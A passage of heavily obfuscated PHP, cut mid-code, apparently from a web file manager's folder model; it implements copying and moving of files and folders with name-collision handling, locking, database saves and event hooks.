Model($cŠĞŒÎÏÄˆ[513])->addAll($Cµæ¿òƒØÊ[$cŠĞŒÎÏÄˆ[511]], array(), !0); if ($Dì‹Õ£‡ãµ != $eé“÷×»Ìê || $A„¶‹öÌ”¤[$cŠĞŒÎÏÄˆ[379]] == $cŠĞŒÎÏÄˆ[83]) { Model($cŠĞŒÎÏÄˆ[514])->eventCopy($eé“÷×»Ìê); } goto FËô°è”Ä«; FËô°è”Ä«: $this->saveAll($Cµæ¿òƒØÊ[$cŠĞŒÎÏÄˆ[512]]); Model($cŠĞŒÎÏÄˆ[167])->linkAdd($Cµæ¿òƒØÊ[$cŠĞŒÎÏÄˆ[510]]); $this->folderSizeReset($eá®„ÛŒà); goto F—««ì™¬„; fö±Š¶åÖ¤: $cŠĞŒÎÏÄˆ =& $_SERVER[í…¶]; $A„¶‹öÌ”¤ = $this->sourceInfo($dÕ¦‹öÑ•); $bÄÔôå§ïç = $this->sourceInfo($eá®„ÛŒà); goto FßŞ›®Ö¡; F—««ì™¬„: $this->updateModifyTime($eá®„ÛŒà); return $eé“÷×»Ìê; goto eÛøÌ¯í·; cÆ‰Ú¼ßÍˆ: $this->_childrenListClear(); $this->lockCopyEnd($dÕ¦‹öÑ•); $this->lockWriteEnd($eá®„ÛŒà, $Cåó‡à‹²Ò); goto bŒåÜÅ·â; FßŞ›®Ö¡: if (!$A„¶‹öÌ”¤ || !$bÄÔôå§ïç || $bÄÔôå§ïç[$cŠĞŒÎÏÄˆ[379]] != $cŠĞŒÎÏÄˆ[83]) { return !1; } if ($this->isParentOf($dÕ¦‹öÑ•, $eá®„ÛŒà)) { return !1; } $Cåó‡à‹²Ò = $a¼“Ë¸¥èÒ ? $a¼“Ë¸¥èÒ : $A„¶‹öÌ”¤[$cŠĞŒÎÏÄˆ[28]]; goto FÛÛ¹Ì•³Ü; FÛÛ¹Ì•³Ü: $this->lockCopyStart($dÕ¦‹öÑ•); $this->lockWriteStart($eá®„ÛŒà, $Cåó‡à‹²Ò); $Cµæ¿òƒØÊ = array($cŠĞŒÎÏÄˆ[510] => array(), $cŠĞŒÎÏÄˆ[511] => array(), $cŠĞŒÎÏÄˆ[512] => array()); goto c½Ç£Şì¾; c½Ç£Şì¾: $this->targetIsDelete = intval($A„¶‹öÌ”¤[$cŠĞŒÎÏÄˆ[406]]); $Dì‹Õ£‡ãµ = $this->fileNameExistCache($eá®„ÛŒà, $A„¶‹öÌ”¤[$cŠĞŒÎÏÄˆ[28]]); $eé“÷×»Ìê = $this->_copy($dÕ¦‹öÑ•, $eá®„ÛŒà, $fÜ¦ÀÄ¶‰ò, $Cµæ¿òƒØÊ, !0, $a¼“Ë¸¥èÒ); goto cÆ‰Ú¼ßÍˆ; eÛøÌ¯í·: } private function _copy($CºŸ“Ü©…, $A…Œ¼¢Š¯å, $AŸôº‘†æÍ, &$D§°³‡ó, $c¤òõ‘‡, $F•ì‚ÓÙ’ì = '') { goto A™—Û‡¶ñ„; A™—Û‡¶ñ„: $d¡×›ÉˆÏ¼ =& $_SERVER[í…¶]; $e‚êÓÉ—Ê = $this->sourceInfoCache($CºŸ“Ü©…); $a­Ùªí” = $e‚êÓÉ—Ê[$d¡×›ÉˆÏ¼[379]] == $d¡×›ÉˆÏ¼[83]; goto e¬–ÆÏ‘; E‹“Á•Š”µ: return $Dğ°À­à£; goto BÍÃéåãŸø; e¬–ÆÏ‘: $EšÊ»¹–Ò÷ = $F•ì‚ÓÙ’ì ? $F•ì‚ÓÙ’ì : $e‚êÓÉ—Ê[$d¡×›ÉˆÏ¼[28]]; $fÄÉ‰÷¯ËÑ = $this->fileNameExistCache($A…Œ¼¢Š¯å, $EšÊ»¹–Ò÷); if ($c¤òõ‘‡) { $this->_childrenAllMake($CºŸ“Ü©…); if ($a­Ùªí” && $fÄÉ‰÷¯ËÑ) { $this->_childrenAllMake($fÄÉ‰÷¯ËÑ); } } goto FÁÀ‚¥êï…; FÁÀ‚¥êï…: if (!$fÄÉ‰÷¯ËÑ) { return $this->_copyCreate($CºŸ“Ü©…, $A…Œ¼¢Š¯å, $EšÊ»¹–Ò÷, $D§°³‡ó); } $Dğ°À­à£ = $fÄÉ‰÷¯ËÑ; if ($a­Ùªí”) { if ($AŸôº‘†æÍ == REPEAT_RENAME_FOLDER) { $EšÊ»¹–Ò÷ = $this->fileNameAutoCache($A…Œ¼¢Š¯å, $EšÊ»¹–Ò÷, $AŸôº‘†æÍ, $a­Ùªí”); $Dğ°À­à£ = $this->_copyCreate($CºŸ“Ü©…, $A…Œ¼¢Š¯å, $EšÊ»¹–Ò÷, $D§°³‡ó); } else { $f³Ì±ˆÂò = $this->_childrenList($CºŸ“Ü©…); foreach ($f³Ì±ˆÂò as $b‚¼ÊíÇ) { $this->_copy($b‚¼ÊíÇ[$d¡×›ÉˆÏ¼[378]], $fÄÉ‰÷¯ËÑ, $AŸôº‘†æÍ, $D§°³‡ó, !1); } } } else { if ($AŸôº‘†æÍ == REPEAT_RENAME || $AŸôº‘†æÍ == REPEAT_RENAME_FOLDER) { $EšÊ»¹–Ò÷ = $this->fileNameAutoCache($A…Œ¼¢Š¯å, $EšÊ»¹–Ò÷, $AŸôº‘†æÍ, $a­Ùªí”); $Dğ°À­à£ = $this->_copyCreate($CºŸ“Ü©…, $A…Œ¼¢Š¯å, $EšÊ»¹–Ò÷, $D§°³‡ó); } else { if ($AŸôº‘†æÍ == REPEAT_REPLACE) { $eÓÛòÖñ× = $this->sourceInfoCache($fÄÉ‰÷¯ËÑ); $A‰¼İïÓ–Ô = $this->fileHistory($eÓÛòÖñ×, $e‚êÓÉ—Ê[$d¡×›ÉˆÏ¼[428]], $e‚êÓÉ—Ê[$d¡×›ÉˆÏ¼[77]]); if ($A‰¼İïÓ–Ô) { $D§°³‡ó[$d¡×›ÉˆÏ¼[510]][] = $e‚êÓÉ—Ê[$d¡×›ÉˆÏ¼[428]]; } } else { if ($AŸôº‘†æÍ == REPEAT_SKIP) { } } } Hook::trigger($d¡×›ÉˆÏ¼[515], array($d¡×›ÉˆÏ¼[516], $e‚êÓÉ—Ê, 0)); } goto E‹“Á•Š”µ; BÍÃéåãŸø: } private function _copyCreate($c¯¢ø¶©², $bëÑ·Ä˜‹Ê, $BÚµ‰–¸, &$d·‡°Îã†) { goto Dºğê¤ßÁˆ; B‘‡íÕ”é: $BÜÂ„ê·Í = $this->sourceInfo($DÚ«»¯ä£¸); foreach ($bºÌİ²‘ïÚ as $F·Ñ»âî·¨) { $d¨«àá°Ï = $this->_makeItemData($F·Ñ»âî·¨, $BÜÂ„ê·Í, $F·Ñ»âî·¨[$f¬ù¿Ÿ¯‡È[28]]); $d¨«àá°Ï[$f¬ù¿Ÿ¯‡È[468]] = $F·Ñ»âî·¨[$f¬ù¿Ÿ¯‡È[468]]; $B‚ì±½Ú™İ[] = $d¨«àá°Ï; } $this->chunkEventSet($f¬ù¿Ÿ¯‡È[520], array($f¬ù¿Ÿ¯‡È[521], $BÜ»ÛÂá, $B©Ì¸Ş‡Ç)); goto Eº·ÏØŠ§¸; eµ‹Â„Óˆ: $this->_childrenListAll($c¯¢ø¶©², $bºÌİ²‘ïÚ); $B©Ì¸Ş‡Ç = count($bºÌİ²‘ïÚ); if ($B©Ì¸Ş‡Ç == 0) { return $DÚ«»¯ä£¸; } goto B‘‡íÕ”é; c–ÚÄ¿Šñ: foreach ($c¢‡Ë“§Æó as $F·Ñ»âî·¨) { $AŠ¹äÈÂ§è = $F·Ñ»âî·¨[$f¬ù¿Ÿ¯‡È[378]]; $Dê¥ÖºÍî´ = $this->_childrenMatch($e÷Åì’ŒØÚ, $F·Ñ»âî·¨, $BÜÂ„ê·Í); $aáõ±“óÕ[] = array($f¬ù¿Ÿ¯‡È[378], $AŠ¹äÈÂ§è, $f¬ù¿Ÿ¯‡È[470], $Dê¥ÖºÍî´[$f¬ù¿Ÿ¯‡È[470]]); $CË«–ã¢ˆ³[] = array($f¬ù¿Ÿ¯‡È[378], $AŠ¹äÈÂ§è, $f¬ù¿Ÿ¯‡È[468], $Dê¥ÖºÍî´[$f¬ù¿Ÿ¯‡È[468]]); $this->_copyApplyMeta($F·Ñ»âî·¨, $d·‡°Îã†); if ($F·Ñ»âî·¨[$f¬ù¿Ÿ¯‡È[379]] != $f¬ù¿Ÿ¯‡È[83]) { $d·‡°Îã†[$f¬ù¿Ÿ¯‡È[510]][] = $F·Ñ»âî·¨[$f¬ù¿Ÿ¯‡È[428]]; } } $this->chunkEventSet($f¬ù¿Ÿ¯‡È[522], array($f¬ù¿Ÿ¯‡È[523], $BÜ»ÛÂá, $B©Ì¸Ş‡Ç)); $this->saveAll($aáõ±“óÕ); goto e‚•ãáñ‘; aº™†¥è¡: $DÚ«»¯ä£¸ = $this->add($BÜ»ÛÂá); $aªËóŸÌïÆ = array($f¬ù¿Ÿ¯‡È[378] => $DÚ«»¯ä£¸, $f¬ù¿Ÿ¯‡È[28] => $BÚµ‰–¸); $this->_copyApplyMeta($aªËóŸÌïÆ, $d·‡°Îã†); goto cÆá¨ÑŞ¨ô; e‚•ãáñ‘: $this->chunkEventSet($f¬ù¿Ÿ¯‡È[524], array($f¬ù¿Ÿ¯‡È[525], $BÜ»ÛÂá, $B©Ì¸Ş‡Ç)); $this->saveAll($CË«–ã¢ˆ³); return $DÚ«»¯ä£¸; goto cõëŠ±ï°î; b¾±œ«ÏÚ: $BÜ»ÛÂá = $this->_makeItemData($F•š‡¥Ö“ã, $f™÷ŸŞö, $BÚµ‰–¸); Hook::trigger($f¬ù¿Ÿ¯‡È[517], $BÜ»ÛÂá); Hook::trigger($f¬ù¿Ÿ¯‡È[518], array($f¬ù¿Ÿ¯‡È[519], $BÜ»ÛÂá, 0)); goto aº™†¥è¡; Dºğê¤ßÁˆ: $f¬ù¿Ÿ¯‡È =& $_SERVER[í…¶]; $F•š‡¥Ö“ã = $this->sourceInfoCache($c¯¢ø¶©²); $f™÷ŸŞö = $this->sourceInfoCache($bëÑ·Ä˜‹Ê); goto b¾±œ«ÏÚ; a–Åà¥Æ›ğ: $e÷Åì’ŒØÚ[$c¯¢ø¶©²] = $DÚ«»¯ä£¸; $aáõ±“óÕ = array(); $CË«–ã¢ˆ³ = array(); goto c–ÚÄ¿Šñ; Eº·ÏØŠ§¸: $this->addAll($B‚ì±½Ú™İ, array(), !1); $c¢‡Ë“§Æó = $this->where(array($f¬ù¿Ÿ¯‡È[470] => $DÚ«»¯ä£¸))->select(); $e÷Åì’ŒØÚ = $this->_childrenMakeRelation($bºÌİ²‘ïÚ, $c¢‡Ë“§Æó); goto a–Åà¥Æ›ğ; cÆá¨ÑŞ¨ô: if ($F•š‡¥Ö“ã[$f¬ù¿Ÿ¯‡È[379]] != $f¬ù¿Ÿ¯‡È[83]) { $d·‡°Îã†[$f¬ù¿Ÿ¯‡È[510]][] = $F•š‡¥Ö“ã[$f¬ù¿Ÿ¯‡È[428]]; return $DÚ«»¯ä£¸; } $bºÌİ²‘ïÚ = array(); $B‚ì±½Ú™İ = array(); goto eµ‹Â„Óˆ; cõëŠ±ï°î: } private function _childrenMakeRelation($D¤£áğÌ’º, $Eê¿Ø£°‚²) { $cÎ«ÊåèÁÜ =& $_SERVER[í…¶]; $aƒø¹ŠÄË½ = array(); $A‰¥“Ñ‡˜â = array(); foreach ($D¤£áğÌ’º as $eĞö”øõñ) { $Bòë•½Ü  = $eĞö”øõñ[$cÎ«ÊåèÁÜ[28]] . $cÎ«ÊåèÁÜ[8] . $eĞö”øõñ[$cÎ«ÊåèÁÜ[468]]; $aƒø¹ŠÄË½[$Bòë•½Ü ] = $eĞö”øõñ[$cÎ«ÊåèÁÜ[378]]; } foreach ($Eê¿Ø£°‚² as $eĞö”øõñ) { $Bòë•½Ü  = $eĞö”øõñ[$cÎ«ÊåèÁÜ[28]] . $cÎ«ÊåèÁÜ[8] . $eĞö”øõñ[$cÎ«ÊåèÁÜ[468]]; $d…ò«æ­Å¼ = $aƒø¹ŠÄË½[$Bòë•½Ü ]; $A‰¥“Ñ‡˜â[$d…ò«æ­Å¼] = $eĞö”øõñ[$cÎ«ÊåèÁÜ[378]]; } return $A‰¥“Ñ‡˜â; } private function _childrenMatch($Eïİ¦ñ¿ªŒ, $FÍˆñÜ¯¾, $bßÍ¡¡âÏ) { goto E—¬¥Û†·Ü; F„¦Ë¯á©: $c•¤ù¯¸ = $F©ó¡òòÏ‰[count($F©ó¡òòÏ‰) - 1]; return array($bÚâôô´·õ[470] => $c•¤ù¯¸, $bÚâôô´·õ[468] => $c‡¼Òµé²¥); goto e»ÕØãÁì; DÚ‘Ë ô©¡: foreach ($EÖ÷Üé÷©’ as $D±Ô›Ş›ò ) { if (isset($Eïİ¦ñ¿ªŒ[$D±Ô›Ş›ò ])) { $c‡¼Òµé²¥ .= $Eïİ¦ñ¿ªŒ[$D±Ô›Ş›ò ] . $bÚâôô´·õ[526]; } } $c‡¼Òµé²¥ = rtrim($c‡¼Òµé²¥, $bÚâôô´·õ[47]) . $bÚâôô´·õ[47]; $F©ó¡òòÏ‰ = $this->parentLevelArray($c‡¼Òµé²¥); goto F„¦Ë¯á©; E—¬¥Û†·Ü: $bÚâôô´·õ =& $_SERVER[í…¶]; $c‡¼Òµé²¥ = $bßÍ¡¡âÏ[$bÚâôô´·õ[468]]; $EÖ÷Üé÷©’ = $this->parentLevelArray($FÍˆñÜ¯¾[$bÚâôô´·õ[468]]); goto DÚ‘Ë ô©¡; e»ÕØãÁì: } private function _makeItemData($dõË»Ñ³Ö, $Cñ‚áŠŠ, $båÓ˜ÌŸ’Å) { $Eß‰†ÒÎá· =& $_SERVER[í…¶]; $Fà÷ŒŞÎÛ = array($Eß‰†ÒÎá·[527] => $dõË»Ñ³Ö[$Eß‰†ÒÎá·[379]], $Eß‰†ÒÎá·[395] => $båÓ˜ÌŸ’Å, $Eß‰†ÒÎá·[528] => $dõË»Ñ³Ö[$Eß‰†ÒÎá·[381]], $Eß‰†ÒÎá·[429] => $dõË»Ñ³Ö[$Eß‰†ÒÎá·[428]], $Eß‰†ÒÎá·[529] => $dõË»Ñ³Ö[$Eß‰†ÒÎá·[77]], $Eß‰†ÒÎá·[530] => $Cñ‚áŠŠ[$Eß‰†ÒÎá·[380]], $Eß‰†ÒÎá·[531] => $Cñ‚áŠŠ[$Eß‰†ÒÎá·[465]], $Eß‰†ÒÎá·[532] => USER_ID, $Eß‰†ÒÎá·[533] => USER_ID, $Eß‰†ÒÎá·[377] => $Cñ‚áŠŠ[$Eß‰†ÒÎá·[378]], $Eß‰†ÒÎá·[534] => $Cñ‚áŠŠ[$Eß‰†ÒÎá·[468]] . $Cñ‚áŠŠ[$Eß‰†ÒÎá·[378]] . $Eß‰†ÒÎá·[47], $Eß‰†ÒÎá·[405] => 0, $Eß‰†ÒÎá·[535] => $Eß‰†ÒÎá·[33]); return $Fà÷ŒŞÎÛ; } private function _copyApplyMeta($dö„¹ßö´, &$DØøùŒé¯ô) { $F†èÆñòõ¤ =& $_SERVER[í…¶]; $F£ÄİôÊ‚„ = $dö„¹ßö´[$F†èÆñòõ¤[378]]; $F¯è³ƒ³Âİ = $dö„¹ßö´[$F†èÆñòõ¤[28]]; if (!isset($dö„¹ßö´[$F†èÆñòõ¤[536]]) || !$dö„¹ßö´[$F†èÆñòõ¤[536]] || $dö„¹ßö´[$F†èÆñòõ¤[536]] == $F†èÆñòõ¤[477]) { $DØøùŒé¯ô[$F†èÆñòõ¤[512]][] = array($F†èÆñòõ¤[378], $F£ÄİôÊ‚„, $F†èÆñòõ¤[536], short_id($F£ÄİôÊ‚„)); } if (Input::check($F¯è³ƒ³Âİ, $F†èÆñòõ¤[537])) { $DØøùŒé¯ô[$F†èÆñòõ¤[511]][] = array($F†èÆñòõ¤[378] => $F£ÄİôÊ‚„, $F†èÆñòõ¤[89] => $F†èÆñòõ¤[425], $F†èÆñòõ¤[368] => str_replace($F†èÆñòõ¤[50], $F†èÆñòõ¤[33], Pinyin::encode($F¯è³ƒ³Âİ))); $DØøùŒé¯ô[$F†èÆñòõ¤[511]][] = array($F†èÆñòõ¤[378] => $F£ÄİôÊ‚„, $F†èÆñòõ¤[89] => $F†èÆñòõ¤[424], $F†èÆñòõ¤[368] => Pinyin::encode($F¯è³ƒ³Âİ, $F†èÆñòõ¤[538])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($FĞ³Æˆ÷²ù) { goto böÄéíîÅ†; FÙ©Ëäô: $aí¢¹Š·Ÿ‰ = array_to_keyvalue($aí¢¹Š·Ÿ‰, $cÍğ‘œõ[378]); foreach ($aí¢¹Š·Ÿ‰ as $a²¼ÆÚ¥ùŞ) { $cİœæˆ® = $a²¼ÆÚ¥ùŞ[$cÍğ‘œõ[470]]; $FĞ³Æˆ÷²ù = $a²¼ÆÚ¥ùŞ[$cÍğ‘œõ[378]]; if (!isset($this->_childrenListCache[$FĞ³Æˆ÷²ù]) && $a²¼ÆÚ¥ùŞ[$cÍğ‘œõ[379]] == $cÍğ‘œõ[83]) { $this->_childrenListCache[$FĞ³Æˆ÷²ù] = array(); } if (!isset($this->_childrenListCache[$cİœæˆ®])) { $this->_childrenListCache[$cİœæˆ®] = array(); } $this->_childrenListCache[$cİœæˆ®][$FĞ³Æˆ÷²ù] = $a²¼ÆÚ¥ùŞ; $this->_childrenItemCache[$FĞ³Æˆ÷²ù] = $a²¼ÆÚ¥ùŞ; } goto ašõäµ„; böÄéíîÅ†: $cÍğ‘œõ =& $_SERVER[í…¶]; $c±Şã†¬¡ = $this->sourceInfo($FĞ³Æˆ÷²ù); $e²İöõï–Æ = $cÍğ‘œõ[539]; goto fÌ•±…œÀ; fÌ•±…œÀ: $eª¦Œ§¬½« = array($cÍğ‘œõ[468] => array($cÍğ‘œõ[492], $c±Şã†¬¡[$cÍğ‘œõ[468]] . $FĞ³Æˆ÷²ù . $cÍğ‘œõ[493]), $cÍğ‘œõ[406] => $this->targetIsDelete); $aí¢¹Š·Ÿ‰ = $this->field($e²İöõï–Æ)->where($eª¦Œ§¬½«)->select(); if (!$aí¢¹Š·Ÿ‰) { return; } goto FÙ©Ëäô; ašõäµ„: } private function _childrenListAll($dŠ¢Ø§ÚĞ, &$aãÑ²†ƒæ) { $e å£¸¯š¹ =& $_SERVER[í…¶]; if (!isset($this->_childrenListCache[$dŠ¢Ø§ÚĞ])) { return; } $BÇ…¥Ò¼„ª = $this->_childrenListCache[$dŠ¢Ø§ÚĞ]; foreach ($BÇ…¥Ò¼„ª as $dùÔ¾Ã™ => $c×Ş‰ì‰ä) { $aãÑ²†ƒæ[$dùÔ¾Ã™] = $c×Ş‰ì‰ä; if ($c×Ş‰ì‰ä[$e å£¸¯š¹[379]] == $e å£¸¯š¹[83]) { $this->_childrenListAll($dùÔ¾Ã™, $aãÑ²†ƒæ); } } } private function sourceInfoCache($F‡òç°Ûï†) { if (isset($this->_childrenItemCache[$F‡òç°Ûï†])) { return $this->_childrenItemCache[$F‡òç°Ûï†]; } return $this->sourceInfo($F‡òç°Ûï†); } private function _childrenList($fš‡«ƒÔ”´) { if (isset($this->_childrenListCache[$fš‡«ƒÔ”´])) { return $this->_childrenListCache[$fš‡«ƒÔ”´]; } return $this->_childrenListSelect($fš‡«ƒÔ”´); } private function _childrenListSelect($bù¹Ê”áÒ†) { goto AÛÂİ•¤’’; AÛÂİ•¤’’: $aó‘ã¨ÖÔ =& $_SERVER[í…¶]; $EˆÕÛ†¯¾ = array($aó‘ã¨ÖÔ[470] => $bù¹Ê”áÒ†, $aó‘ã¨ÖÔ[406] => $this->targetIsDelete); $c¿Â¨Ô‹²ƒ = $this->where($EˆÕÛ†¯¾)->select(); goto Bà‡´Œ—Ùé; A½áå¤Ëºó: foreach ($B“É‹¼ÍŠØ as $bù¹Ê”áÒ† => $b­¦¶¥â…‹) { $this->_childrenItemCache[$bù¹Ê”áÒ†] = $b­¦¶¥â…‹; } return $B“É‹¼ÍŠØ; goto E©Õ¼ì¬Ñè; Bà‡´Œ—Ùé: $c¿Â¨Ô‹²ƒ = $c¿Â¨Ô‹²ƒ ? $c¿Â¨Ô‹²ƒ : array(); $B“É‹¼ÍŠØ = array_to_keyvalue($c¿Â¨Ô‹²ƒ, $aó‘ã¨ÖÔ[378]); $this->_childrenListCache[$bù¹Ê”áÒ†] = $B“É‹¼ÍŠØ; goto A½áå¤Ëºó; E©Õ¼ì¬Ñè: } private function fileNameExistCache($bæ§öŸ“ˆ, $D‰«ÔÁÉ°Š) { $b±Ï½œ‹ò =& $_SERVER[í…¶]; $D‰«ÔÁÉ°Š = strtolower($D‰«ÔÁÉ°Š); $CÅŞâö£° = $this->_childrenList($bæ§öŸ“ˆ); foreach ($CÅŞâö£° as $DİÔ®‡À™Ê) { if ($D‰«ÔÁÉ°Š == strtolower($DİÔ®‡À™Ê[$b±Ï½œ‹ò[28]])) { return $DİÔ®‡À™Ê[$b±Ï½œ‹ò[378]]; } } return !1; } private function fileNameAutoCache($DÏç»¢‰·“, $a² Š¦±ÉÃ, $d¢Ï°Ûˆ½, $eßØÆ†°íğ) { $DÑøÜÑˆã… =& $_SERVER[í…¶]; $eÆÆ‚ˆ‰å = $this->_childrenList($DÏç»¢‰·“); $D‡ˆ‹•ê = array_to_keyvalue($eÆÆ‚ˆ‰å, $DÑøÜÑˆã…[33], $DÑøÜÑˆã…[28]); return $this->fileNameAutoGet($D‡ˆ‹•ê, $a² Š¦±ÉÃ, $d¢Ï°Ûˆ½, $eßØÆ†°íğ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($bğÄãàõô¤, $aë‘Á»øÌ, $C‰Æ¿˜¼Öù = REPEAT_REPLACE, $cÏã®ÒÎŸ« = '') { goto b¢ù‡‚–ó‰; BÓóÊôò¸ğ: $this->lockMoveEnd($bğÄãàõô¤); $this->lockWriteEnd($aë‘Á»øÌ, $D§ğí‘ šÏ); $this->folderSizeReset($fŠ£»®¾†œ[$eé ŒÚ òò[470]]); goto AÏÇÏÒµ‚ä; b¢ù‡‚–ó‰: $eé ŒÚ òò =& $_SERVER[í…¶]; $fŠ£»®¾†œ = $this->sourceInfo($bğÄãàõô¤); $d ƒÌ…•ñ = $this->sourceInfo($aë‘Á»øÌ); goto cÅ’¾¶Ë†; bŠ‚‰é¶ˆ‹: $this->lockWriteStart($aë‘Á»øÌ, $D§ğí‘ šÏ); $DÅ‹öƒœµ = array($eé ŒÚ òò[510] => array(), $eé ŒÚ òò[542] => !1); $this->clearShare($bğÄãàõô¤, $aë‘Á»øÌ); goto CŸ“ãÇ§‹; cÅ’¾¶Ë†: if ($fŠ£»®¾†œ[$eé ŒÚ òò[470]] == $d ƒÌ…•ñ[$eé ŒÚ òò[378]]) { if ($fŠ£»®¾†œ[$eé ŒÚ òò[406]] == $eé ŒÚ òò[83]) { Model($eé ŒÚ òò[404])->restore(array($bğÄãàõô¤)); } return $bğÄãàõô¤; } $F˜ºî±ê‰‡ = $this->pathInfoMore($bğÄãàõô¤); if ($this->isParentOf($bğÄãàõô¤, $aë‘Á»øÌ)) { return !1; } goto b®÷½ì; AÏÇÏÒµ‚ä: $this->folderSizeReset($aë‘Á»øÌ); $bøĞñÁÃä = array($fŠ£»®¾†œ[$eé ŒÚ òò[470]], $aë‘Á»øÌ); if ($fŠ£»®¾†œ[$eé ŒÚ òò[379]] == $eé ŒÚ òò[83]) { $bøĞñÁÃä[] = $bğÄãàõô¤; } goto a²çè…¡Ìñ; a²çè…¡Ìñ: $this->updateModifyTime($bøĞñÁÃä); Model($eé ŒÚ òò[514])->eventMove($bğÄãàõô¤, $fŠ£»®¾†œ[$eé ŒÚ òò[470]], $aë‘Á»øÌ); Hook::trigger($eé ŒÚ òò[541], $F˜ºî±ê‰‡); goto B‰ò¡øçÙ¯; CŸ“ãÇ§‹: $F˜ìâçôĞ  = $this->fileNameExistCache($aë‘Á»øÌ, $fŠ£»®¾†œ[$eé ŒÚ òò[28]]); $DãÑèœ‹Şù = $this->_move($bğÄãàõô¤, $aë‘Á»øÌ, $C‰Æ¿˜¼Öù, $DÅ‹öƒœµ, $cÏã®ÒÎŸ«); $this->sourceCacheClear(); goto Câº«ó“; BÚµâÉÆ’Õ: if ($fŠ£»®¾†œ[$eé ŒÚ òò[470]] == $aë‘Á»øÌ && $cÏã®ÒÎŸ« != $fŠ£»®¾†œ[$eé ŒÚ òò[28]]) { $A×Ò¾æ·ª² = $this->fileNameExist($aë‘Á»øÌ, $cÏã®ÒÎŸ«); if ($A×Ò¾æ·ª² && $fŠ£»®¾†œ[$eé ŒÚ òò[379]] == $eé ŒÚ òò[477]) { goto F÷±ĞÍÚÇ; A§ÜÁ‘ãàõ: $this->removeNow($bğÄãàõô¤, !1); $this->folderSizeReset($aë‘Á»øÌ); Hook::trigger($eé ŒÚ òò[541], $F˜ºî±ê‰‡); goto Bî—ÚÊï‚ø; Bî—ÚÊï‚ø: return $A×Ò¾æ·ª²; goto fĞÓ¯­óÂ; F÷±ĞÍÚÇ: $E¿ÑŒ÷óÊ¯ = $this->sourceInfo($A×Ò¾æ·ª²); $e„È‘Ç‚î = $this->fileHistory($E¿ÑŒ÷óÊ¯, $fŠ£»®¾†œ[$eé ŒÚ òò[428]], $fŠ£»®¾†œ[$eé ŒÚ òò[77]]); if (!$e„È‘Ç‚î) { Model($eé ŒÚ òò[431])->remove($fŠ£»®¾†œ[$eé ŒÚ òò[428]]); } goto A§ÜÁ‘ãàõ; fĞÓ¯­óÂ: } } $D§ğí‘ šÏ = $cÏã®ÒÎŸ« ? $cÏã®ÒÎŸ« : $fŠ£»®¾†œ[$eé ŒÚ òò[28]]; $this->lockMoveStart($bğÄãàõô¤); goto bŠ‚‰é¶ˆ‹; Câº«ó“: if ($fŠ£»®¾†œ[$eé ŒÚ òò[379]] == $eé ŒÚ òò[83] && $F˜ìâçôĞ ) { $this->folderSizeResetChildren($DãÑèœ‹Şù); } Model($eé ŒÚ òò[167])->linkAdd($DÅ‹öƒœµ[$eé ŒÚ òò[510]]); if ($F˜ìâçôĞ  && $DÅ‹öƒœµ[$eé ŒÚ òò[542]]) { $this->removeNow($bğÄãàõô¤, !1); } goto BÓóÊôò¸ğ; B‰ò¡øçÙ¯: return $DãÑèœ‹Şù; goto AùÚ¥Šâ¬è; b®÷½ì: if (!$fŠ£»®¾†œ || !$d ƒÌ…•ñ || $d ƒÌ…•ñ[$eé ŒÚ òò[379]] != $eé ŒÚ òò[83]) { return !1; } Hook::trigger($eé ŒÚ òò[540], $F˜ºî±ê‰‡); $this->targetIsDelete = intval($fŠ£»®¾†œ[$eé ŒÚ òò[406]]); goto BÚµâÉÆ’Õ; AùÚ¥Šâ¬è: } private function _move($C‰îÜ¡«³Æ, $fÈÂ‘ˆÈ³«, $B²Êùé‚ïÅ, &$A•¦½«À°, $Bò£ˆµÁº = '') { goto få¯À‘«©µ; A°Ê–¯®¿Í: $this->lockWriteStart($fÈÂ‘ˆÈ³«, $eĞ¸ÔŠˆ); if (!$A±¥‚„ ’) { return $this->_moveForce($C‰îÜ¡«³Æ, $fÈÂ‘ˆÈ³«, $eĞ¸ÔŠˆ); } $DãÊ¡‚²¢ª = $A±¥‚„ ’; goto Fƒ£ó´›‰Ü; Fƒ£ó´›‰Ü: $B ®—²ØËç = !1; if ($cñ³©ÚàË…) { if ($B²Êùé‚ïÅ == REPEAT_RENAME_FOLDER) { $eĞ¸ÔŠˆ = $this->fileNameAuto($fÈÂ‘ˆÈ³«, $eĞ¸ÔŠˆ, $B²Êùé‚ïÅ, $cñ³©ÚàË…); $DãÊ¡‚²¢ª = $this->_moveForce($C‰îÜ¡«³Æ, $fÈÂ‘ˆÈ³«, $eĞ¸ÔŠˆ); } else { if ($B²Êùé‚ïÅ == REPEAT_RENAME_FOLDER) { $B²Êùé‚ïÅ = REPEAT_RENAME; } $eØÕ£¨ˆ†æ = $this->_childrenListSelect($C‰îÜ¡«³Æ); foreach ($eØÕ£¨ˆ†æ as $d¸ñË’Ï¾¿) { $this->_move($d¸ñË’Ï¾¿[$CÎ–Áõä»ƒ[378]], $A±¥‚„ ’, $B²Êùé‚ïÅ, $A•¦½«À°); } $B ®—²ØËç = !0; } } else { if ($B²Êùé‚ïÅ == REPEAT_SKIP) { $B ®—²ØËç = !0; } else { if ($B²Êùé‚ïÅ == REPEAT_RENAME || $B²Êùé‚ïÅ == REPEAT_RENAME_FOLDER) { $eĞ¸ÔŠˆ = $this->fileNameAuto($fÈÂ‘ˆÈ³«, $eĞ¸ÔŠˆ, $B²Êùé‚ïÅ, $cñ³©ÚàË…); $DãÊ¡‚²¢ª = $this->_moveForce($C‰îÜ¡«³Æ, $fÈÂ‘ˆÈ³«, $eĞ¸ÔŠˆ); } else { if ($B²Êùé‚ïÅ == REPEAT_REPLACE) { $Dˆ ¤î×¼ = $this->sourceInfoCache($A±¥‚„ ’); $CÇ’Î®¯êÇ = $this->fileHistory($Dˆ ¤î×¼, $FäÕğ°õ’®[$CÎ–Áõä»ƒ[428]], $FäÕğ°õ’®[$CÎ–Áõä»ƒ[77]]); if ($CÇ’Î®¯êÇ) { $A•¦½«À°[$CÎ–Áõä»ƒ[510]][] = $FäÕğ°õ’®[$CÎ–Áõä»ƒ[428]]; } else { $B ®—²ØËç = !0; } } } } } if ($B ®—²ØËç && !$A•¦½«À°[$CÎ–Áõä»ƒ[542]]) { $A•¦½«À°[$CÎ–Áõä»ƒ[542]] = !0; } goto cÜî…×é¾Õ; få¯À‘«©µ: $CÎ–Áõä»ƒ =& $_SERVER[í…¶]; $FäÕğ°õ’® = $this->sourceInfo($C‰îÜ¡«³Æ); $cñ³©ÚàË… = 